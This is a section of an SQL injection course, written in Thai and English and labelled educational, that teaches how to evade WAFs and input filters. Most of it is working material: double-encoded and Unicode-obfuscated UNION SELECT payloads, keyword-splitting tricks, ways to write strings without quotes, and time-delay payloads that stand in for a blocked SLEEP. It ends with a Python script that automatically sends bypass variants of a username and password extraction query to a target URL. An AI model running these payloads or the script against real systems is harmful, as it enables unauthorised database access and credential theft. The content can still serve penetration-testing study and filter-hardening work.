# Part 046: Advanced Input Filter Bypass Techniques

## ภาพรวม

เทคนิคขั้นสูงสำหรับสิทธิ์ผ่าน input filters, WAF, และ blacklist-based protections

**ขั้นตอนที่ 721-740**

---

## 721. Double Encoding Bypass

```
# Single URL encoding (blocked by WAF):
' UNION SELECT 1,2,3-- -
-> %27%20UNION%20SELECT%201%2C2%2C3--%20-

# Double URL encoding (bypasses single-decode filters):
%27 -> %2527
%20 -> %2520
%2C -> %252C

# Payload double-encoded:
%2527%2520UNION%2520SELECT%25201%252C2%252C3--%2520-

# Some filters decode once แล้ว pass ต่อ แต่ DB decode อีกครั้ง:
# Filter sees: %27%20UNION... (no quote, pass)
# DB receives: ' UNION... (decoded, executes)
```

---

## 722. Unicode/UTF-8 Bypass

```
# Full-width unicode characters:
UNION -> ＵＮＩＯＮ
SELECT -> ＳＥＬＥＣＴ

# MySQL-specific: overlong UTF-8
# Some MySQL versions accept overlong encoding

# Cyrillic lookalikes:
# с (Cyrillic) vs c (Latin) in SQL keywords

# Normalizer in WAF converts to ASCII
# But some WAFs miss these:
SELECT -> S%c0%a5ELECT (invalid UTF-8 sequence)

# Test with Python:
import requests

payloads = [
    "' ＵＮＩＯＮ SELECT NULL--",
    "' UNïON SELECT NULL--",
    "' UNI%00ON SELECT NULL--",  # null byte injection
]

for p in payloads:
    r = requests.get('http://target/page', params={'id': p})
    if 'mysql' in r.text.lower() or 'syntax' in r.text.lower():
        print(f"Possible bypass: {p!r}")
```

---

## 723. Keyword Substitution

```sql
-- SELECT alternatives:
SELECT -> SEL/**/ECT
SELECT -> SEL%09ECT     -- tab
SELECT -> SEL%0aECT     -- newline

-- UNION alternatives (for UNION SELECT):
' UNION ALL SELECT NULL--
' UNION DISTINCT SELECT NULL--

-- WHERE alternatives:
-- (Some filters block WHERE but not HAVING)
' HAVING 1=1--

-- INFORMATION_SCHEMA bypass:
-- MySQL 8.0+ alternative:
SELECT * FROM mysql.innodb_table_stats;
SELECT table_name FROM performance_schema.tables;

-- Table name in hex:
SELECT * FROM 0x7573657273;  -- "users" in hex
-- Actually this doesn't work directly,
-- but column values can be hex:
SELECT 0x68656c6c6f;  -- returns "hello"

-- String without quotes:
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110);  -- 'admin'
SELECT * FROM users WHERE username=0x61646d696e;               -- 'admin'
```

---

## 724. Time-Delay Filter Bypass

```sql
-- SLEEP blocked:
-- MySQL alternatives:
SELECT BENCHMARK(5000000, SHA1('test'));  -- CPU delay
SELECT BENCHMARK(50000000, MD5('a'));     -- longer

-- GET_LOCK for delay:
SELECT GET_LOCK('test', 5);  -- waits 5 sec if already locked

-- MSSQL WAITFOR alternatives:
IF 1=1 WAITFOR DELAY '0:0:5'
-- If WAITFOR blocked:
IF 1=1 SELECT * FROM (SELECT TOP 1000000 a.name FROM sysobjects a,sysobjects b) x

-- PostgreSQL pg_sleep blocked:
SELECT (SELECT 1 FROM pg_sleep(5));  -- alternative form
SELECT clock_timestamp()-pg_postmaster_start_time();  -- info
```

---

## 725. Multi-Step Filter Bypass

```python
import requests
import urllib.parse

class FilterBypassTester:
    def __init__(self, url: str, param: str):
        self.url = url
        self.param = param
    
    def generate_bypasses(self, payload: str) -> list:
        """Generate multiple bypass variations of a payload"""
        bypasses = []
        
        # Original
        bypasses.append(('original', payload))
        
        # Case variation
        bypasses.append(('case', payload.swapcase()))
        
        # Comment injection
        bypass_comment = payload.replace(' ', '/**/')
        bypasses.append(('comments', bypass_comment))
        
        # Tab instead of space
        bypass_tab = payload.replace(' ', '\t')
        bypasses.append(('tabs', bypass_tab))
        
        # Newline instead of space
        bypass_nl = payload.replace(' ', '\n')
        bypasses.append(('newlines', bypass_nl))
        
        # Double URL encode
        double_enc = urllib.parse.quote(urllib.parse.quote(payload))
        bypasses.append(('double_encode', double_enc))
        
        # Mix case + comments
        mixed = ''
        for i, c in enumerate(payload):
            if c.isalpha() and i % 2 == 0:
                mixed += c.upper()
            elif c == ' ':
                mixed += '/**/'
            else:
                mixed += c
        bypasses.append(('mixed', mixed))
        
        return bypasses
    
    def test_bypasses(self, base_payload: str):
        bypasses = self.generate_bypasses(base_payload)
        for name, payload in bypasses:
            try:
                r = requests.get(self.url, params={self.param: payload}, timeout=5)
                indicators = ['error', 'syntax', 'mysql', 'sql']
                if any(i in r.text.lower() for i in indicators):
                    print(f"[+] Possible bypass with {name}: {payload[:50]}...")
                elif len(r.text) > 1000:  # got results
                    print(f"[+] Got data with {name}")
            except Exception as e:
                print(f"[-] Error: {e}")

# Usage
tester = FilterBypassTester('http://target/search', 'q')
tester.test_bypasses("' UNION SELECT 1,username,password FROM users-- -")
```

---

## สรุป

Advanced Filter Bypass:
- **Double encoding** - %25 prefix (เกิด %27 หลัง decode)
- **Unicode** - Full-width, lookalikes
- **Keyword sub** - Comments, whitespace variants, hex values
- **Time delay** - BENCHMARK, GET_LOCK แทน SLEEP
- **Automated** - FilterBypassTester class

---

*Part 046 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
